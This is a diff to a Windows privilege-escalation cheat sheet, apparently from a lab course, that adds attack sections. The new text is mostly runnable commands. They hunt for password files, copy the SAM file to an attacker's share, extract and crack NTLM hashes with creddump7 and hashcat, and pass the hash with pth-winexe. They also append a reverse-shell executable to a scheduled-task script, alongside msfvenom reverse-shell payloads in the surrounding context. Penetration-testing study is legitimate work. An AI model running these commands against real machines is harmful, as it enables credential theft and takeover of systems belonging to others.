@@ -679,6 +679,10 @@ python3 exploit.py
   <summary>3] Credentials from configuration files [↓]</summary>
   [✓] Enumerated
 </details>
+<details>
+  <summary>3] Credentials from SAM[↓]</summary>
+  [✓] Enumerated
+</details>
 
 
 
@@ -732,6 +736,20 @@ python3 exploit.py
 </details>
 
 ***
+#### Initial Enumeration
+
+```ps1
+
+# Check user and groups
+whoami
+net user {USERNAME}
+
+# Use WinPeas Enumeration
+
+# Run Seatbelt
+
+
+```
 
 #### Credential Access
 
@@ -773,6 +791,38 @@ runas /savecred /user:admin C:\PrivEsc\reverse.exe
 #########################################################################
 #### 3. Credentials from configuration files ############################
 #########################################################################
+
+# Winpeas Enumeration
+.\winPEASany.exe quiet cmd searchfast filesinfo
+
+# Recursively search for files in the current directory with “pass” in the name, or ending in “.config”
+dir /s *pass* == *.config
+
+# Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt
+findstr /si password *.xml *.ini *.txt
+
+#########################################################################
+#### 4. Credentials from SAM ############################################
+#########################################################################
+
+# Winpeas Enumeration
+.\winPEASany.exe quiet cmd searchfast filesinfo
+
+# Copy the files back to Kali
+copy C:\Windows\Repair\SAM \\{IP ADDRESS}\tools\
+
+# Download the latest version of the creddump suite
+git clone https://github.com/Neohapsis/creddump7.git
+
+# Run the pwdump tool against the SAM and SYSTEM files to extract the hashes
+python2 creddump7/pwdump.py SYSTEM SAM
+
+# Crack the admin user hash using hashcat
+hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
+
+# Alternative solution - Pass the Hash
+pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //{IP ADDRESS} cmd.exe
+pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //{IP ADDRESS} cmd.exe
 
 ```
 <br />
@@ -962,6 +1012,33 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP ADDRESS} LPORT={PORT} -f msi
 
 # Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+```
+
+<br />
+
+##### Scheduled Tasks
+
+```ps1
+
+#########################################################################
+#### 1. Scheduled Tasks #################################################
+#########################################################################
+
+# Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account. Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.
+
+# List all scheduled tasks your user can see:
+schtasks /query /fo LIST /v
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+
+# Inspect interesting scripts
+type C:\DevTools\CleanUp.ps1
+
+# Check Permissions for write access on script
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+
+# Use echo to append a call to our reverse shell executable to the end of the script
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
 
 ```
 
